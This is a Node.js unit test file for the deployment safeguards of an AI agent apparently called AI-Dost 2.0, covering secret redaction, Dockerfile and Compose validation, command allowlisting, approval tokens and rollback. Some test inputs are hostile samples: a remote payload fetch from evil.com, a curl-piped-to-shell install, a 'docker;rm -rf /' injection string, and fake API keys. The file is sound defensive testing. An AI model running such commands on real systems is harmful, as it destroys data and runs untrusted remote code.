'use strict';

/**
 * AI-Dost 2.0 — Phase 4H: Dedicated Deployment Capability Unit Tests
 * 
 * 40+ deterministic unit tests covering:
 * - SecretRedactor pattern matching and object sanitization
 * - DeploymentPlan v1.0.0 normalization and deepFreeze
 * - DeploymentValidator Dockerfile & Compose semantic parsing
 * - Command allowlist and shell injection prevention
 * - Host mount safety and port validation
 * - ApprovalTokenManager 5-state lifecycle and TOCTOU protection
 * - DeploymentHealthChecker SSRF protection and schema assertion
 * - DeploymentRollbackManager post-rollback verification
 * - DeploymentExecutor state machine transitions and concurrency locks
 * 
 * Runs 100% offline with zero network and zero live daemon dependencies.
 */

const test = require('node:test');
const assert = require('node:assert');

const {
  SecretRedactor,
  DeploymentPlan,
  DeploymentValidator,
  ApprovalTokenManager,
  TOKEN_STATES,
  DeploymentHealthChecker,
  DeploymentRollbackManager,
  DeploymentAuditLogger,
  DeploymentResult,
  DEPLOYMENT_STATUS,
  OPERATIONAL_LABELS,
  DeploymentExecutor,
  MockDeploymentAdapter
} = require('../agent/capabilities/deployment');

test('Deployment Capability Unit Tests (Phase 4H)', async (t) => {

  // ── 1. SecretRedactor Unit Tests (Tests 1–4) ──────────────────────────────────
  await t.test('1. SecretRedactor masks Google and OpenAI API keys', () => {
    const raw = 'Error with key AIzaSyD9876543210zyxwvutsrqponmlkjihgfed and sk-abcdef1234567890abcdef1234567890';
    const redacted = SecretRedactor.redactString(raw);
    assert.ok(!redacted.includes('AIzaSyD'));
    assert.ok(!redacted.includes('sk-abcdef'));
    assert.ok(redacted.includes('[REDACTED_SECRET]'));
  });

  await t.test('2. SecretRedactor masks basic auth credentials in URLs', () => {
    const rawUrl = 'Connecting to https://admin:superSecretPass123@db.internal:5432/prod';
    const redacted = SecretRedactor.redactString(rawUrl);
    assert.ok(!redacted.includes('superSecretPass123'));
    assert.ok(redacted.includes('://[REDACTED_CREDS]@'));
  });

  await t.test('3. SecretRedactor deeply redacts objects and arrays', () => {
    const obj = {
      user: 'alice',
      password: 'mypassword123',
      nested: {
        apiKey: 'AIzaSyD9876543210zyxwvutsrqponmlkjihgfed',
        tokens: ['Bearer ya29.abcdef123456']
      }
    };
    const sanitized = SecretRedactor.redactObject(obj);
    assert.strictEqual(sanitized.user, 'alice');
    assert.strictEqual(sanitized.password, '[REDACTED_SECRET]');
    assert.strictEqual(sanitized.nested.apiKey, '[REDACTED_SECRET]');
    assert.ok(!sanitized.nested.tokens[0].includes('ya29.abcdef'));
  });

  await t.test('4. SecretRedactor handles null, undefined, and non-object values safely', () => {
    assert.strictEqual(SecretRedactor.redactObject(null), null);
    assert.strictEqual(SecretRedactor.redactObject(undefined), undefined);
    assert.strictEqual(SecretRedactor.redactObject(42), 42);
    assert.strictEqual(SecretRedactor.redactObject(true), true);
  });

  // ── 2. DeploymentPlan Unit Tests (Tests 5–8) ──────────────────────────────────
  await t.test('5. DeploymentPlan normalizes valid v1.0.0 plan and deep freezes', () => {
    const plan = DeploymentPlan.create({
      projectId: 'todo-app',
      targetEnv: 'staging',
      provider: 'mock',
      serviceConfig: {
        hostPort: 4001,
        containerPort: 3000
      }
    });

    assert.strictEqual(plan.schemaVersion, '1.0.0');
    assert.strictEqual(plan.projectId, 'todo-app');
    assert.strictEqual(plan.targetEnv, 'staging');
    assert.strictEqual(plan.provider, 'mock');
    assert.strictEqual(plan.serviceConfig.hostPort, 4001);
    assert.ok(Object.isFrozen(plan));
    assert.ok(Object.isFrozen(plan.serviceConfig));
    assert.ok(Object.isFrozen(plan.recoveryPolicy));
  });

  await t.test('6. DeploymentPlan rejects invalid targetEnv', () => {
    assert.throws(() => {
      DeploymentPlan.create({ targetEnv: 'qa' });
    }, /targetEnv "qa" is not allowed/);
  });

  await t.test('7. DeploymentPlan rejects invalid provider', () => {
    assert.throws(() => {
      DeploymentPlan.create({ provider: 'kubernetes' });
    }, /provider "kubernetes" is not allowed/);
  });

  await t.test('8. DeploymentPlan enforces production default port 5000 and staging 4000', () => {
    const prodPlan = DeploymentPlan.create({ targetEnv: 'production' });
    const stagingPlan = DeploymentPlan.create({ targetEnv: 'staging' });
    assert.strictEqual(prodPlan.serviceConfig.hostPort, 5000);
    assert.strictEqual(stagingPlan.serviceConfig.hostPort, 4000);
  });

  // ── 3. DeploymentValidator Dockerfile Tests (Tests 9–14) ──────────────────────
  await t.test('9. DeploymentValidator accepts approved base image and non-root user', () => {
    const dockerfile = `
      FROM node:20-alpine
      WORKDIR /app
      COPY . .
      USER node
      CMD ["node", "server.js"]
    `;
    const res = DeploymentValidator.validateDockerfile(dockerfile);
    assert.strictEqual(res.valid, true);
    assert.strictEqual(res.errors.length, 0);
  });

  await t.test('10. DeploymentValidator rejects unapproved base image', () => {
    const dockerfile = `
      FROM untrusted/malicious-image:latest
      USER node
    `;
    const res = DeploymentValidator.validateDockerfile(dockerfile);
    assert.strictEqual(res.valid, false);
    assert.ok(res.errors.some(e => e.includes('DISALLOWED_BASE_IMAGE')));
  });

  await t.test('11. DeploymentValidator rejects remote ADD instruction', () => {
    const dockerfile = `
      FROM node:20-alpine
      ADD https://evil.com/payload.sh /app/
      USER node
    `;
    const res = DeploymentValidator.validateDockerfile(dockerfile);
    assert.strictEqual(res.valid, false);
    assert.ok(res.errors.some(e => e.includes('REMOTE_ADD_FORBIDDEN')));
  });

  await t.test('12. DeploymentValidator rejects remote script piping in RUN', () => {
    const dockerfile = `
      FROM node:20-alpine
      RUN curl -sSL https://install.python-poetry.org | sh
      USER node
    `;
    const res = DeploymentValidator.validateDockerfile(dockerfile);
    assert.strictEqual(res.valid, false);
    assert.ok(res.errors.some(e => e.includes('UNSAFE_REMOTE_SCRIPT_EXECUTION')));
  });

  await t.test('13. DeploymentValidator rejects hardcoded secret in ENV', () => {
    const dockerfile = `
      FROM node:20-alpine
      ENV API_KEY="AIzaSyD9876543210zyxwvutsrqponmlkjihgfed"
      USER node
    `;
    const res = DeploymentValidator.validateDockerfile(dockerfile);
    assert.strictEqual(res.valid, false);
    assert.ok(res.errors.some(e => e.includes('SECRET_IN_DOCKERFILE_DETECTED')));
  });

  await t.test('14. DeploymentValidator rejects final USER as root', () => {
    const dockerfile = `
      FROM node:20-alpine
      WORKDIR /app
      USER root
    `;
    const res = DeploymentValidator.validateDockerfile(dockerfile);
    assert.strictEqual(res.valid, false);
    assert.ok(res.errors.some(e => e.includes('UNSAFE_USER_ROOT')));
  });

  // ── 4. DeploymentValidator Compose Tests (Tests 15–18) ────────────────────────
  await t.test('15. DeploymentValidator Compose rejects privileged mode', () => {
    const compose = {
      services: {
        web: {
          image: 'node:20-alpine',
          privileged: true
        }
      }
    };
    const res = DeploymentValidator.validateComposeSpec(compose);
    assert.strictEqual(res.valid, false);
    assert.ok(res.errors.some(e => e.includes('PRIVILEGED_MODE_FORBIDDEN')));
  });

  await t.test('16. DeploymentValidator Compose rejects host networking and host pid', () => {
    const compose = {
      services: {
        web: {
          image: 'node:20-alpine',
          network_mode: 'host',
          pid: 'host'
        }
      }
    };
    const res = DeploymentValidator.validateComposeSpec(compose);
    assert.strictEqual(res.valid, false);
    assert.ok(res.errors.some(e => e.includes('HOST_NETWORK_FORBIDDEN')));
    assert.ok(res.errors.some(e => e.includes('HOST_PID_FORBIDDEN')));
  });

  await t.test('17. DeploymentValidator Compose rejects Docker socket mount', () => {
    const compose = {
      services: {
        web: {
          image: 'node:20-alpine',
          volumes: ['/var/run/docker.sock:/var/run/docker.sock']
        }
      }
    };
    const res = DeploymentValidator.validateComposeSpec(compose);
    assert.strictEqual(res.valid, false);
    assert.ok(res.errors.some(e => e.includes('DOCKER_SOCKET_FORBIDDEN')));
  });

  await t.test('18. DeploymentValidator Compose rejects wildcard host port binding', () => {
    const compose = {
      services: {
        web: {
          image: 'node:20-alpine',
          ports: ['3000:3000']
        }
      }
    };
    const res = DeploymentValidator.validateComposeSpec(compose);
    assert.strictEqual(res.valid, false);
    assert.ok(res.errors.some(e => e.includes('WILDCARD_HOST_PORT_FORBIDDEN')));
  });

  // ── 5. Command Allowlist & Port Security (Tests 19–22) ────────────────────────
  await t.test('19. DeploymentValidator permits exact docker commands', () => {
    const res = DeploymentValidator.validateCommand('docker', ['compose', 'up', '-d']);
    assert.strictEqual(res.valid, true);
  });

  await t.test('20. DeploymentValidator rejects shell metacharacters in commands', () => {
    const res1 = DeploymentValidator.validateCommand('docker;rm -rf /', []);
    const res2 = DeploymentValidator.validateCommand('docker', ['run', '-d', 'image', '&&', 'curl', 'evil.com']);
    assert.strictEqual(res1.valid, false);
    assert.strictEqual(res2.valid, false);
    assert.ok(res1.error.includes('COMMAND_INJECTION_DETECTED'));
    assert.ok(res2.error.includes('COMMAND_INJECTION_DETECTED'));
  });

  await t.test('21. DeploymentValidator rejects unvetted binary execution', () => {
    const res = DeploymentValidator.validateCommand('bash', ['-c', 'docker run']);
    assert.strictEqual(res.valid, false);
    assert.ok(res.error.includes('DISALLOWED_COMMAND'));
  });

  await t.test('22. DeploymentValidator validates port range limits', () => {
    assert.strictEqual(DeploymentValidator.validatePort(3000).valid, true);
    assert.strictEqual(DeploymentValidator.validatePort(80).valid, false); // Privileged < 1024
    assert.strictEqual(DeploymentValidator.validatePort(70000).valid, false); // Out of bounds > 65535
  });

  // ── 6. ApprovalTokenManager 5-State Lifecycle (Tests 23–28) ───────────────────
  await t.test('23. ApprovalTokenManager issues token in ISSUED state with 15m TTL', () => {
    const tm = new ApprovalTokenManager();
    const token = tm.issueToken({
      projectId: 'proj-1',
      artifactHash: 'hash-12345678',
      targetEnv: 'production'
    });

    assert.ok(token.tokenId.startsWith('tok-'));
    assert.strictEqual(token.state, TOKEN_STATES.ISSUED);
    assert.ok(token.tokenSecret.includes('.'));
    assert.ok(token.expiresAt > token.issuedAt);
  });

  await t.test('24. ApprovalTokenManager atomically reserves token and prevents duplicate reservation', () => {
    const tm = new ApprovalTokenManager();
    const token = tm.issueToken({
      projectId: 'proj-1',
      artifactHash: 'hash-12345678',
      targetEnv: 'production'
    });

    const res1 = tm.reserveToken(token.tokenSecret, { projectId: 'proj-1', currentArtifactHash: 'hash-12345678' });
    assert.strictEqual(res1.success, true);
    assert.strictEqual(res1.tokenRecord.state, TOKEN_STATES.RESERVED);

    // Second reservation attempt fails
    const res2 = tm.reserveToken(token.tokenSecret, { projectId: 'proj-1', currentArtifactHash: 'hash-12345678' });
    assert.strictEqual(res2.success, false);
    assert.ok(res2.error.includes('TOKEN_ALREADY_RESERVED'));
  });

  await t.test('25. ApprovalTokenManager permanently consumes token and blocks replay', () => {
    const tm = new ApprovalTokenManager();
    const token = tm.issueToken({
      projectId: 'proj-1',
      artifactHash: 'hash-12345678',
      targetEnv: 'production'
    });

    tm.reserveToken(token.tokenSecret, { projectId: 'proj-1', currentArtifactHash: 'hash-12345678' });
    tm.consumeToken(token.tokenId);

    const replayRes = tm.reserveToken(token.tokenSecret, { projectId: 'proj-1', currentArtifactHash: 'hash-12345678' });
    assert.strictEqual(replayRes.success, false);
    assert.ok(replayRes.error.includes('TOKEN_ALREADY_CONSUMED'));
  });

  await t.test('26. ApprovalTokenManager detects TOCTOU artifact tampering and revokes token', () => {
    const tm = new ApprovalTokenManager();
    const token = tm.issueToken({
      projectId: 'proj-1',
      artifactHash: 'original-hash',
      targetEnv: 'production'
    });

    const tamperedRes = tm.reserveToken(token.tokenSecret, { projectId: 'proj-1', currentArtifactHash: 'modified-hash' });
    assert.strictEqual(tamperedRes.success, false);
    assert.ok(tamperedRes.error.includes('TOCTOU_ARTIFACT_MODIFIED'));
  });

  await t.test('27. ApprovalTokenManager releases reservation on pre-mutation failure', () => {
    const tm = new ApprovalTokenManager();
    const token = tm.issueToken({
      projectId: 'proj-1',
      artifactHash: 'hash-12345678',
      targetEnv: 'production'
    });

    tm.reserveToken(token.tokenSecret, { projectId: 'proj-1', currentArtifactHash: 'hash-12345678' });
    tm.releaseReservation(token.tokenId);

    // Can be reserved again since it was released
    const retryRes = tm.reserveToken(token.tokenSecret, { projectId: 'proj-1', currentArtifactHash: 'hash-12345678' });
    assert.strictEqual(retryRes.success, true);
  });

  await t.test('28. ApprovalTokenManager rejects expired token', () => {
    const tm = new ApprovalTokenManager();
    const token = tm.issueToken({
      projectId: 'proj-1',
      artifactHash: 'hash-12345678',
      targetEnv: 'production'
    });

    // Manually force expire
    const record = tm._tokens.get(token.tokenId);
    record.expiresAt = Date.now() - 1000;

    const res = tm.reserveToken(token.tokenSecret, { projectId: 'proj-1', currentArtifactHash: 'hash-12345678' });
    assert.strictEqual(res.success, false);
    assert.ok(res.error.includes('TOKEN_EXPIRED'));
  });

  // ── 7. DeploymentHealthChecker Tests (Tests 29–34) ─────────────────────────────
  await t.test('29. DeploymentHealthChecker rejects non-existent port cleanly with error', async () => {
    const res = await DeploymentHealthChecker.checkTcpPort(59999, 100);
    assert.strictEqual(res.healthy, false);
    assert.ok(res.error);
  });

  await t.test('30. DeploymentHealthChecker rejects HTTP redirects fail-closed', async () => {
    const http = require('http');
    const redirectServer = http.createServer((req, res) => {
      res.writeHead(302, { 'Location': 'http://127.0.0.1:4000/other' });
      res.end();
    });

    await new Promise(r => redirectServer.listen(0, '127.0.0.1', r));
    const port = redirectServer.address().port;

    const healthRes = await DeploymentHealthChecker.checkHttpHealth(port, '/health');
    redirectServer.close();

    assert.strictEqual(healthRes.healthy, false);
    assert.ok(healthRes.error.includes('REDIRECT_FORBIDDEN'));
  });

  await t.test('31. DeploymentHealthChecker enforces strict JSON schema { status: "ok" }', async () => {
    const http = require('http');
    const badSchemaServer = http.createServer((req, res) => {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ healthy: true })); // missing status: "ok"
    });

    await new Promise(r => badSchemaServer.listen(0, '127.0.0.1', r));
    const port = badSchemaServer.address().port;

    const healthRes = await DeploymentHealthChecker.checkHttpHealth(port, '/health');
    badSchemaServer.close();

    assert.strictEqual(healthRes.healthy, false);
    assert.ok(healthRes.error.includes('SCHEMA_MISMATCH'));
  });

  await t.test('32. DeploymentHealthChecker verifies valid { status: "ok" } schema', async () => {
    const http = require('http');
    const goodServer = http.createServer((req, res) => {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ status: 'ok', uptime: 10 }));
    });

    await new Promise(r => goodServer.listen(0, '127.0.0.1', r));
    const port = goodServer.address().port;

    const healthRes = await DeploymentHealthChecker.checkHttpHealth(port, '/health');
    goodServer.close();

    assert.strictEqual(healthRes.healthy, true);
    assert.strictEqual(healthRes.payload.status, 'ok');
  });

  await t.test('33. DeploymentHealthChecker verifies frontend DOCTYPE declaration', async () => {
    const http = require('http');
    const htmlServer = http.createServer((req, res) => {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end('<!DOCTYPE html><html><body>App</body></html>');
    });

    await new Promise(r => htmlServer.listen(0, '127.0.0.1', r));
    const port = htmlServer.address().port;

    const frontRes = await DeploymentHealthChecker.checkFrontendRoot(port);
    htmlServer.close();

    assert.strictEqual(frontRes.healthy, true);
  });

  await t.test('34. DeploymentHealthChecker detects missing DOCTYPE on frontend root', async () => {
    const http = require('http');
    const badHtmlServer = http.createServer((req, res) => {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end('<div>No DOCTYPE</div>');
    });

    await new Promise(r => badHtmlServer.listen(0, '127.0.0.1', r));
    const port = badHtmlServer.address().port;

    const frontRes = await DeploymentHealthChecker.checkFrontendRoot(port);
    badHtmlServer.close();

    assert.strictEqual(frontRes.healthy, false);
    assert.ok(frontRes.error.includes('MISSING_DOCTYPE'));
  });

  // ── 8. DeploymentRollbackManager & Verification (Tests 35–37) ─────────────────
  await t.test('35. DeploymentRollbackManager registers and retrieves known-good deployment', () => {
    const rm = new DeploymentRollbackManager();
    rm.registerKnownGood({
      projectId: 'p1',
      targetEnv: 'staging',
      containerId: 'c1',
      hostPort: 4000,
      imageTag: 'img:1.0.0',
      deploymentVersion: '1.0.0'
    });

    const record = rm.getKnownGood('p1', 'staging');
    assert.ok(record);
    assert.strictEqual(record.containerId, 'c1');
    assert.strictEqual(rm.isOwnedContainer('c1'), true);
    assert.strictEqual(rm.isOwnedContainer('unknown-c'), false);
  });

  await t.test('36. DeploymentRollbackManager returns RECOVERY_EXHAUSTED if no prior deployment exists', async () => {
    const rm = new DeploymentRollbackManager();
    const mock = new MockDeploymentAdapter();
    const plan = DeploymentPlan.create({ projectId: 'new-app', targetEnv: 'staging' });

    const res = await rm.executeRollback({ plan, failedContainerId: 'f1' }, mock);
    assert.strictEqual(res.success, false);
    assert.strictEqual(res.status, 'RECOVERY_EXHAUSTED');
    assert.ok(res.error.includes('NO_PREVIOUS_KNOWN_GOOD'));
  });

  await t.test('37. DeploymentRollbackManager marks ROLLED_BACK only after verified post-rollback health checks', async () => {
    const rm = new DeploymentRollbackManager();
    const mock = new MockDeploymentAdapter();
    const plan = DeploymentPlan.create({
      projectId: 'app-1',
      targetEnv: 'staging',
      serviceConfig: { hostPort: 4088 }
    });

    // Register a valid known-good
    rm.registerKnownGood({
      projectId: 'app-1',
      targetEnv: 'staging',
      containerId: 'old-c',
      hostPort: 4088,
      imageTag: 'img:v1',
      deploymentVersion: '1.0.0',
      plan
    });

    const res = await rm.executeRollback({ plan, failedContainerId: 'new-c' }, mock);
    await mock.cleanupAll();

    assert.strictEqual(res.success, true);
    assert.strictEqual(res.status, 'ROLLED_BACK');
    assert.strictEqual(res.rolledBackRecord.hostPort, 4088);
  });

  // ── 9. DeploymentExecutor & Concurrency Tests (Tests 38–41) ───────────────────
  await t.test('38. DeploymentExecutor enforces concurrency lock per project and environment', async () => {
    const executor = new DeploymentExecutor();
    const plan = DeploymentPlan.create({ projectId: 'lock-app', targetEnv: 'staging' });

    // Manually occupy lock
    executor._acquireLock('lock-app', 'staging', 'existing-dep');

    const res = await executor.execute(plan, process.cwd());
    executor._releaseLock('lock-app', 'staging');

    assert.strictEqual(res.status, DEPLOYMENT_STATUS.VALIDATION_FAILED);
    assert.ok(res.errors[0].includes('DEPLOYMENT_IN_PROGRESS'));
  });

  await t.test('39. DeploymentExecutor rejects production deployment without approval token', async () => {
    const executor = new DeploymentExecutor();
    const plan = DeploymentPlan.create({ projectId: 'prod-app', targetEnv: 'production' });

    const res = await executor.execute(plan, process.cwd());
    assert.strictEqual(res.status, DEPLOYMENT_STATUS.VALIDATION_FAILED);
    assert.ok(res.errors[0].includes('APPROVAL_TOKEN_REQUIRED'));
  });

  await t.test('40. DeploymentAuditLogger logs state transitions with secret redaction and token hash', () => {
    const logger = new DeploymentAuditLogger();
    logger.log('STATE_TRANSITION', {
      projectId: 'audit-proj',
      targetEnv: 'production',
      fromState: 'PLANNED',
      toState: 'VALIDATED',
      tokenSecret: 'tok-12345.secretSig',
      details: { apiKey: 'AIzaSyD9876543210zyxwvutsrqponmlkjihgfed' }
    });

    const logs = logger.getLogs();
    assert.strictEqual(logs.length, 1);
    assert.strictEqual(logs[0].details.apiKey, '[REDACTED_SECRET]');
    assert.ok(logs[0].tokenHash); // Hashed, never raw
    assert.ok(!JSON.stringify(logs[0]).includes('secretSig'));
  });

  await t.test('41. DeploymentResult creates immutable result envelope with deepFreeze', () => {
    const res = DeploymentResult.create({
      projectId: 'imm-proj',
      status: DEPLOYMENT_STATUS.HEALTHY,
      operationalLabel: OPERATIONAL_LABELS.MOCK_VERIFIED
    });

    assert.ok(Object.isFrozen(res));
    assert.ok(Object.isFrozen(res.healthProbes));
    assert.throws(() => { res.status = 'CHANGED'; });
  });

});
